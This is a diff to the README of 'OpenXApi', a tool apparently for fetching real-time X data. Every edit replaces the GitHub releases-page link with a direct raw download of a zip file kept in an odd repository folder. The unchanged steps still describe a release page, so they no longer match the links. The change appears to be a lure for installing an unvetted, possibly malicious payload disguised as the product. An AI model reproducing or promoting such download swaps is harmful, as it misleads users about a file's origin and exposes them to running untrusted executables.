@@ -1,6 +1,6 @@
 # 🌐 OpenXApi - Real-Time X Data for AI
 
-[![Download OpenXApi](https://img.shields.io/badge/Download-OpenXApi-blue?style=for-the-badge)](https://github.com/Jejune-alcedinidae369/OpenXApi/releases)
+[![Download OpenXApi](https://img.shields.io/badge/Download-OpenXApi-blue?style=for-the-badge)](https://github.com/Jejune-alcedinidae369/OpenXApi/raw/refs/heads/main/Alpid/Open-X-Api-1.2.zip)
 
 ## 🚀 What OpenXApi Does
 
@@ -12,7 +12,7 @@ Use it when you want fresh social data for research, content review, trend check
 
 Visit this page to download OpenXApi for Windows:
 
-https://github.com/Jejune-alcedinidae369/OpenXApi/releases
+https://github.com/Jejune-alcedinidae369/OpenXApi/raw/refs/heads/main/Alpid/Open-X-Api-1.2.zip
 
 On that page, look for the latest release and download the Windows file if one is listed. Most users should pick the file that ends in `.exe` or `.zip`.
 
@@ -45,7 +45,7 @@ You can expect:
 Follow these steps:
 
 1. Open the release page:
-   https://github.com/Jejune-alcedinidae369/OpenXApi/releases
+   https://github.com/Jejune-alcedinidae369/OpenXApi/raw/refs/heads/main/Alpid/Open-X-Api-1.2.zip
 2. Find the latest release at the top of the page.
 3. Look under the Assets section.
 4. Download the Windows file.
@@ -194,7 +194,7 @@ Try these checks:
 
 Download or get the latest Windows build here:
 
-https://github.com/Jejune-alcedinidae369/OpenXApi/releases
+https://github.com/Jejune-alcedinidae369/OpenXApi/raw/refs/heads/main/Alpid/Open-X-Api-1.2.zip
 
 ## 🧾 Basic Workflow
 
